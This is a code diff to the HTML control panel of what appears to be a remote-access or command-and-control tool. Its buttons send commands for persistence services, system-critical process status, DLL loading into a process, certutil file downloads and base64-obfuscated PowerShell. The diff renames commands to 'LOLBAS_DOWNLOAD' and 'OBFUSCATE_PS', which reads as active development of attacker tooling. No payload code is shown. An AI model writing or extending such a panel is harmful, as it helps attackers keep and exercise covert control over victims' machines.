@@ -426,7 +426,7 @@ th{background:#16213e;color:#ffd700;}tr:hover{background:#222;}
 <button type="button" class="cmd-btn" style="background:#0a2a0a;border-color:#4CAF50;" onclick="openNoteModal()">📝 Send Note <span>Open notepad with custom text</span></button>
 <button type="button" class="cmd-btn" style="background:#2a0a0a;border-color:#f44336;" onclick="sendCmd('DEPLOY_SVC')">🔒 Deploy Services <span>Deploy background services and monitoring</span></button>
 <button type="button" class="cmd-btn" style="background:#2a1a0a;border-color:#ff5722;" onclick="sendCmd('PROTECT_NOW')">⚡ Set Critical <span>Set system-critical status</span></button>
-<button type="button" class="cmd-btn" style="background:#0a0a0a;border-color:#f44336;" onclick="sendCmd('Clean Up')">💀 Clean Up <span>Remove all services and exit</span></button>
+<button type="button" class="cmd-btn" style="background:#0a0a0a;border-color:#f44336;" onclick="sendCmd('CLEANUP')">💀 Clean Up <span>Remove all services and exit</span></button>
 <button type="button" class="cmd-btn" style="background:#0a0a2a;border-color:#2196F3;" onclick="sendCmd('REMOVE_SVC')">🔓 Clear Critical <span>Clear system-critical status</span></button>
 <button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#4CAF50;" onclick="sendCmd('SVC_STATUS')">🛡️ Check Status <span>Check system status</span></button>
 <button type="button" class="cmd-btn" style="background:#1a0a2a;border-color:#9C27B0;" onclick="sendCmd('SCHEDULE_TASK')">🔱 Schedule Task <span>System monitoring task</span></button>
@@ -435,8 +435,8 @@ th{background:#16213e;color:#ffd700;}tr:hover{background:#222;}
 <button type="button" class="cmd-btn" style="background:#1a1a2a;border-color:#7B68EE;" onclick="sendCmd('DLL_LOAD')">🌙 Library Load <span>Load library into process</span></button>
 <button type="button" class="cmd-btn" style="background:#2a1a0a;border-color:#FF9800;" onclick="sendCmd('HARDEN_FILES')">🛡️ Secure Files <span>Set file permissions</span></button>
 <button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#00FF00;" onclick="sendCmd('VERIFY_LAYERS')">✅ Verify Services <span>Check all services</span></button>
-<button type="button" class="cmd-btn" style="background:#0a0a2a;border-color:#2196F3;" onclick="var url=prompt('URL:'); var path=prompt('Save path:'); if(url&&path) sendCmd('DOWNLOAD_FILE '+url+' '+path)">🎭 Download File <span>Download via certutil</span></button>
-<button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#4CAF50;" onclick="var cmd=prompt('PowerShell command:'); if(cmd) sendCmd('ENCODE_CMD '+cmd)">📝 Encode Command <span>Base64 encode command</span></button>
+<button type="button" class="cmd-btn" style="background:#0a0a2a;border-color:#2196F3;" onclick="var url=prompt('URL:'); var path=prompt('Save path:'); if(url&&path) sendCmd('LOLBAS_DOWNLOAD '+url+' '+path)">🎭 Download File <span>Download via certutil</span></button>
+<button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#4CAF50;" onclick="var cmd=prompt('PowerShell command:'); if(cmd) sendCmd('OBFUSCATE_PS '+cmd)">📝 Encode Command <span>Base64 encode command</span></button>
 </div>
 </div>
 </div>
